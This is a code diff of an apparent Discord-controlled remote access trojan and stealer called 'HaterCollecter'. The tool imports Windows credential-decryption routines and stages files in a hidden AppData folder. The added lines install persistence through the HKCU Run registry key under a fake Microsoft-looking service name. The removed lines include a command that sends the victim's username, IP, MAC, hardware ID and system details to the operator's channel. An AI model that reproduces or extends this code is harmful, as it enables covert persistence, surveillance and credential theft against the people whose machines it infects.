@@ -28,6 +28,7 @@ from zipfile import ZipFile
 import platform
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
+import json
 
 
 
@@ -43,8 +44,9 @@ permissions = Permissions()
 permissions.administrator = True
 client = discord.Client(intents=intents)
 
-
-token = "YOUR_TOKEN_HERE"
+file_path = os.path.abspath(sys.argv[0])
+register = ["reg", "add", r"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\Windows\\CurrentVersion\\Run", "/v", "MicrosoftServiceCollecter", "/t", "REG_SZ", "/d", file_path]
+subprocess.call(['echo', 'y', '|'] + register, shell=True)
 
 temp = os.getenv("appdata")
 temp_path = os.path.join(temp, ''.join(random.choices(
@@ -124,26 +126,6 @@ async def on_ready():
 
         if channel:
             await channel.send("""```@everyone !helpme for commands.```""")
-
-
-@bot.command(name="getinfo")
-async def sendusername(ctx):
-    if control_channel(ctx) == True:
-        try:
-
-            embed = discord.Embed(
-                title="HaterCollecter",
-                color=5639644,
-                description=f'''```💻 **PC Username:** `{username}`\n:desktop: **PC Name:** `{hostname}`\n🌐 **OS:** `{computer_os}`\n\n👀 **IP:** `{ip}`\n🍏 **MAC:** `{mac}`\n🔧 **HWID:** `{hwid}`\n\n📟 **CPU:** `{cpu}`\n🎮 **GPU:** `{gpu}`\n💾 **RAM:** `{ram}GB````'''
-            )
-            embed.set_footer(text="0giv HaterCollecter | Created By 0giv")
-            embed.set_thumbnail(
-                url="https://avatars.githubusercontent.com/u/138109429?v=4")
-
-            await ctx.channel.send(embed=embed)
-
-        except Exception as e:
-            await ctx.channel.send(f"```Error :\n {e} ``` ")
 
 
 @bot.command(name=("ss"))
@@ -982,7 +964,3 @@ md (Make Directory):
 Usage: md [directory name]
 Example: md NewFolder
                    ```""")
-
-
-bot.run(token)
-
